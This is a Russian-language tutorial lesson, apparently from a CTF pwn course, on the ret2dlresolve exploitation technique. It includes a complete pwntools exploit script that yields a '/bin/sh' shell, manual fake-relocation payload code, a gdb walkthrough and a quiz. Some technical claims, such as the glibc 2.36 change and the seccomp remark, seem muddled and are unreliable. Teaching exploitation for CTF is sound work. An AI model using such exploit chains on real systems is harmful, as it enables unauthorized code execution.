---
id: pwn-ret2dlresolve
title: "ret2dlresolve: вызов функций без утечки libc"
category: pwn
parent: pwn-mitigations-bypass
difficulty: hard
order: 3
tags: [ret2dlresolve, dynamic-linker, pwntools, no-leak]
prerequisites: [pwn-mitigations, pwn-got-plt]
useful_for:
  - "CTF Pwn категория"
  - "Эксплуатация без утечек"
  - "Vulnerability research"
estimated_minutes: 55
summary: "Учимся заставлять динамический линкер резолвить произвольный символ (system) без знания libc — через подделку структур .rela.plt, .dynstr и symtab."
---
ret2dlresolve — техника, позволяющая вызвать произвольную функцию libc, даже если её нет ни в PLT, ни в GOT, и даже если в бинаре нет гаджета `syscall`. Идея: заставить динамический линкер (`_dl_runtime_resolve`) сам разрешить нужный символ по подделанной структуре релокации, размещённой нами в памяти. Это «высший пилотаж» для случаев, когда гаджетов и символов катастрофически не хватает.

## Идея: заставляем линкер работать на нас

ELF-программа использует ленивое связывание: при первом вызове функции PLT передаёт управление резолверу, который по индексу символа находит адрес в libc и записывает его в GOT. Индекс — это смещение в таблице `.rela.plt`. Если подделать структуру релокации и подсунуть резолверу свой индекс, он разрешит произвольное имя — например, `system` — и вызовет его. Для этого нужны: запись в известное место (обычно `.bss`) и вызов PLT0 (`plt[0]`), который и передаёт управление резолверу.

## Структуры, которые нужно подделать

- `Elf64_Rela` — описывает релокацию: `r_offset` (куда писать), `r_info` (индекс символа и тип), `r_addend`.
- `Elf64_Sym` — описывает символ: `st_name` (смещение имени в строковой таблице), `st_info`, `st_value` и др.
- Строковая таблица — массив байтов с именем функции (`"system\x00"`).

Подделанные структуры размещаются в `.bss` через `read`, а `r_info` указывает на наш `Elf64_Sym`, чей `st_name` ссылается на строку `"system"`. Резолвер находит символ в libc и прыгает туда.

## Упрощение через pwntools Ret2dlresolvePayload

Собирать структуры вручную трудоёмко; pwntools делает это автоматически:

```python
from pwn import *
context.binary = elf = ELF('./chall')
rop = ROP(elf)

dlresolve = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])
rop.read(0, dlresolve.data_addr)          # читаем наши поддельные структуры
rop.ret2dlresolve(dlresolve)              # вызываем резолвер
raw_rop = rop.chain()
```

`dlresolve.data_addr` — адрес в `.bss`, куда нужно записать структуры (`dlresolve.payload`). `rop.ret2dlresolve` добавляет вызов PLT0 с нужным индексом.

## Полный пример

```python
#!/usr/bin/env python3
from pwn import *
context.binary = elf = ELF('./chall')
OFFSET = 72

def start():
    return process('./chall') if args.LOCAL else remote('host', 1337)

def exploit():
    p = start()
    rop = ROP(elf)
    dlresolve = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])
    rop.read(0, dlresolve.data_addr)          # stage: залить структуры
    rop.ret2dlresolve(dlresolve)              # вызов резолвера -> system('/bin/sh')
    payload = flat({OFFSET: rop.chain()})
    p.sendline(payload)
    p.send(dlresolve.payload)                 # сами структуры
    p.interactive()

exploit()
```

Ожидаемый результат — интерактивный shell. Ключевые шаги: (1) цепочка вызывает `read(0, bss, n)`, чтобы записать структуры; (2) затем `ret2dlresolve` настраивает регистры и прыгает в PLT0; (3) резолвер находит `system` и вызывает её с аргументом `/bin/sh`.

## Ручная сборка (для понимания)

Если pwntools недоступен, структуры собираются вручную:

```python
from pwn import *
bss = elf.bss() + 0x400
# Elf64_Sym: st_name(4), st_info(1), st_other(1), st_shndx(2), st_value(8), st_size(8)
sym_off = 0x100
str_off = 0x200
name_addr = bss + str_off
sym = p32(str_off) + p8(0x12) + p8(0) + p16(0) + p64(0) + p64(0)
rela = p64(bss + 0x300) + p64((sym_off // 0x18) << 32 | 7) + p64(0)
data = b'/bin/sh\x00'.ljust(str_off - 8, b'\x00') + b'system\x00'
data = data.ljust(sym_off, b'\x00') + sym + rela
```

Здесь `r_info = (sym_index << 32) | R_X86_64_JUMP_SLOT`, а `r_offset` — адрес GOT-записи, куда резолвер запишет адрес. Индекс символа вычисляется из адреса подделанного `Elf64_Sym` относительно таблицы символов.

## Условия применимости

| Условие | Почему нужно |
|---|---|
| контролируемый `read` | залить структуры в bss |
| известен адрес bss | куда писать |
| вызов PLT0 доступен | вход в резолвер |
| гаджеты для rdi/rsi/rdx | аргументы `read` |
| writable `.dynamic`/bss | резолвер пишет в GOT |

Если нет гаджетов для аргументов `read`, комбинируйте с ret2csu (`pwn-ret2csu`).

## Тонкости и подводные камни

- **Индекс символа кратен 24.** `Elf64_Sym` — 24 байта; `r_info >> 32` — это индекс, а адрес символа = `symtab + index*24`.
- **`r_offset` должен указывать в writable-память.** Иначе резолвер упадёт при записи.
- **Адрес `read` и `bss` известны.** При PIE нужна утечка базы.
- **Версия glibc.** Механика резолвера менялась (например, glibc 2.36 переработала `_dl_runtime_resolve`); проверяйте версию цели.
- **Полный RELRO.** Если `.dynamic`/GOT read-only, техника может не сработать.
- **Выравнивание стека.** Как всегда, добавляйте `ret` при `movaps`-креше.
- **Размер payload.** Структуры плюс имя могут быть длинными — проверьте, что влезают.

## Справочные таблицы

| Структура | Размер | Поля |
|---|---|---|
| `Elf64_Rela` | 24 | offset(8), info(8), addend(8) |
| `Elf64_Sym` | 24 | name(4), info(1), other(1), shndx(2), value(8), size(8) |
| `R_X86_64_JUMP_SLOT` | — | тип 7 |
| `R_X86_64_GLOB_DAT` | — | тип 6 |

| Инструмент | Назначение |
|---|---|
| `Ret2dlresolvePayload(elf, symbol, args)` | авто-сборка |
| `rop.read(0, dlresolve.data_addr)` | stage-загрузка |
| `rop.ret2dlresolve(dlresolve)` | вызов резолвера |
| `readelf -r ./chall` | таблица релокаций |

## Что дальше / решение

Дальше: `pwn-ret2csu` (гаджеты для аргументов), `pwn-rop` (общая сборка), `pwn-seccomp-srop` (когда нет `syscall`). Практический алгоритм: (1) убедитесь, что нужной функции нет в PLT и нет `syscall`; (2) проверьте наличие `read` и writable `.bss`; (3) соберите `Ret2dlresolvePayload`; (4) добавьте `rop.read` для загрузки структур; (5) вызовите `ret2dlresolve`. Если glibc слишком новая или RELRO полный — переходите к SROP или FSOP.

## Как линкер находит символ: пошагово

Разберём, что делает `_dl_runtime_resolve`, когда мы передаём ему управление через PLT0. PLT0 — первая запись PLT; её код пушит `link_map` и индекс, затем прыгает в резолвер. Резолвер берёт `link_map` (структура загруженного объекта), находит таблицу символов (`symtab`) и таблицу строк (`strtab`), по индексу `r_info >> 32` достаёт `Elf64_Sym`, по его `st_name` — строку имени в `strtab`. Затем ищет это имя в библиотеках (libc) и, найдя, вычисляет адрес, записывает его в `GOT[r_offset]` и прыгает туда.

Наша атака: подсунуть резолверу такие `symtab`, `strtab` и `Elf64_Sym`, которые указывают на нашу строку `"system"` и на нужный `r_offset`. Тогда резолвер «разрешит» `system` и вызовет её. Это возможно, потому что резолвер доверяет структурам, на которые указывает `link_map`, а `link_map` в свою очередь берётся из GOT-записи — но мы подменяем не её, а индекс символа, передаваемый в стеке.

## Смещения и вычисление индексов

Ключевые формулы для ручной сборки:

- `sym_index = (fake_sym_addr - real_symtab) // sizeof(Elf64_Sym)`. Но при подмене мы задаём `r_info = (sym_index << 32) | type`, где `sym_index` — индекс в реальной `symtab`, указывающий на нашу область (если мы не можем её подменить) — на практике pwntools подставляет свой `Elf64_Sym` и вычисляет индекс так, чтобы резолвер попал именно на него.
- `r_offset` — адрес в writable-памяти, куда резолвер запишет найденный адрес. Обычно это GOT-запись или область в bss.
- `st_name = fake_str - real_strtab` — смещение нашей строки относительно начала строковой таблицы.

`Ret2dlresolvePayload` делает все вычисления за нас; вручную они нужны лишь для понимания и для целей без pwntools.

## Когда ret2dlresolve не сработает

| Причина | Следствие |
|---|---|
| Full RELRO | `.dynamic`/GOT read-only, резолвер не запишет |
| glibc 2.36+ | изменён `_dl_runtime_resolve`, ломается часть эксплойтов |
| нет `read` | нечем залить структуры |
| нет `plt0` | некуда вернуться |
| seccomp | резолвер использует `mprotect`/`mmap`, может быть запрещён |

В этих случаях переходите к SROP (`pwn-seccomp-srop`), FSOP (`pwn-fsop`) или перезаписи `.fini_array` (`pwn-fini-init-array`).

## Практический чек-лист

1. `checksec` — RELRO должен быть Partial/No.
2. Убедитесь, что нужной функции нет в PLT (иначе зачем ret2dlresolve).
3. Проверьте наличие `read` и writable `.bss`.
4. `ROP(elf).find_gadget(['pop rdi','ret'])` для аргументов `read`.
5. Соберите `Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])`.
6. Добавьте `rop.read(0, dlresolve.data_addr)` перед `ret2dlresolve`.
7. Отправьте `rop.chain()`, затем `dlresolve.payload`.
8. Проверьте локально, при `movaps`-креше добавьте `ret`.

## Разбор реального вывода резолвера

Полезно увидеть, как резолвер работает «вживую». Поставьте брейкпоинт на PLT0 и на `_dl_runtime_resolve`, запустите программу и вызовите любую libc-функцию:

```bash
gdb ./chall
(gdb) b *0x401020          # PLT0
(gdb) run
(gdb) x/2gx $rsp           # link_map и индекс
(gdb) info symbol $rdi
```

Вы увидите, что PLT0 кладёт на стек `link_map` и индекс символа. Именно эти два значения резолвер использует для поиска. Подделав индекс (через наш ROP-вызов PLT0 с нужным стеком), мы заставляем его искать другой символ. В pwntools `rop.ret2dlresolve` формирует стек так, чтобы PLT0 получил адрес нашего подделанного `link_map`-подобного окружения. Это тонкая механика, но понимание её помогает, когда автоматика не срабатывает на нестандартной glibc.

## Заключение

ret2dlresolve — оружие последнего рубежа в userland, когда нет ни нужных символов в PLT, ни `syscall`. Он превращает наличие `read` и writable `.bss` в полноценный вызов произвольной функции. Освойте `Ret2dlresolvePayload` — и вы сможете решать задачи, где другие сдаются.

## Квиз

```quiz
- question: "Что делает ret2dlresolve?"
  options:
    - "Заставляет линкер разрешить произвольный символ без знания libc"
    - "Отключает ASLR"
    - "Заполняет tcache"
    - "Снимает canary"
  answer: 0
  explanation: "Подделка .rela.plt/.dynstr/sym заставляет _dl_runtime_resolve вызвать system."
- question: "Какая функция линкера выполняет резолв при первом вызове PLT?"
  options:
    - "_dl_runtime_resolve"
    - "main"
    - "printf"
    - "_start"
  answer: 0
  explanation: "PLT[0] ведёт в _dl_runtime_resolve, который разрешает символ по reloc_arg."
- question: "Какой тип релокации используется для PLT-записи на x86-64?"
  options:
    - "R_X86_64_JUMP_SLOT (7)"
    - "R_X86_64_NONE"
    - "R_X86_64_64"
    - "R_X86_64_GLOB_DAT"
  answer: 0
  explanation: "PLT-вызовы используют R_X86_64_JUMP_SLOT."
- question: "Что нужно, чтобы разместить fake-структуры?"
  options:
    - "Возможность записи в .bss (например, через read)"
    - "Только утечка canary"
    - "Отключённый NX"
    - "Только PIE"
  answer: 0
  explanation: "Структуры пишутся в rw-память (.bss) перед вызовом резолвера."
- question: "Какая pwntools-функция автоматизирует ret2dlresolve?"
  options:
    - "Ret2dlresolvePayload"
    - "shellcraft"
    - "cyclic"
    - "fmtstr_payload"
  answer: 0
  explanation: "Ret2dlresolvePayload строит fake-структуры и цепочку."
```

## Где пригодится

- **CTF:** Pwn — задачи без утечки libc.
- **Bug bounty:** построение цепочек в сложных условиях.
- **Пентест:** разработка эксплойтов.
- **Работа:** exploit development.
